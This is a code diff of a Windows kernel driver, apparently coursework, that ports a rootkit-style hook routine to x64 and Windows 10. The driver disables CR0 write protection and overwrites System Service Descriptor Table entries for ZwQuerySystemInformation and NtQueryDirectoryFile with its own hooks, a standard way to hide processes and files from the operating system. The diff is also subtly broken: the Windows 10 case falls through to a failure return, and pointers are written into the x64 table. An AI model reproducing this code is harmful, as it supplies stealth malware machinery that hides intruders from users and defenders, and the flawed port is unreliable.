@@ -47,17 +47,38 @@ NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING Registry
 	//DbgBreakPoint();
 	switch(*NtBuildNumber){
 		case WINXP_BUILD_NUMBER:
-			INIT_VARIABLES(WINXP);
-			//INIT_OFFSETS_WINXP();
+#ifdef _M_IX86
+			INIT_VARIABLES(WINXP_x86);
+#else
+			INIT_VARIABLES(WINXP_x64);
+#endif // _
 			break;
+		
 		case WIN7_BUILD_NUMBER:
 			DbgPrint("Win7\n");
-			INIT_VARIABLES(WIN7);
+#ifdef _M_IX86
+			INIT_VARIABLES(WIN7_x86);
+#else
+			INIT_VARIABLES(WIN7_x64);
+#endif // _
 			break;
+
 		case WIN8_BUILD_NUMBER:
 			DbgPrint("Win8\n");
-			//INIT_VARIABLES(WIN8_1);
-			break;
+#ifdef _M_IX86
+			//INIT_VARIABLES(WIN8_1_x86);
+#else
+			//INIT_VARIABLES(WIN8_1_x64);
+#endif // _
+			break;	
+
+		case WIN10_20H2_BUILD_NUMBER:
+#ifdef _M_IX86
+			//INIT_VARIABLES(WIN10_20H2_x86);
+#else
+			INIT_VARIABLES(WIN10_20H2_x64);
+#endif // _
+
 		default:
 			return STATUS_UNSUCCESSFUL;
 	}
@@ -90,13 +111,13 @@ VOID InsertAllHook(VOID) {
 	glRealNtQuerySystemInformation =
 		(ZW_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]];
 
-	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG)HookZwQuerySystemInformation;
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG_PTR)HookZwQuerySystemInformation;
 	
 	// BASE TASK 2
 	glRealNtQueryDirectoryFile =
 		(NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]];
 
-	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG)HookNtQueryDirectoryFile;
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG_PTR)HookNtQueryDirectoryFile;
 	
 	WriteCR0(reg);
 
@@ -109,10 +130,10 @@ VOID RemoveAllHook(VOID) {
 	reg = ClearWP();
 
 	// BASE TASK 0
-	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG)glRealNtQuerySystemInformation;
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQuerySystemInformation_]] = (ULONG_PTR)glRealNtQuerySystemInformation;
 
 	// BASE TASK 2
-	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG)glRealNtQueryDirectoryFile;
+	KeServiceDescriptorTable->Base[glSysCallNumbers[_ZwQueryDirectoryFile_]] = (ULONG_PTR)glRealNtQueryDirectoryFile;
 	
 
 	WriteCR0(reg);
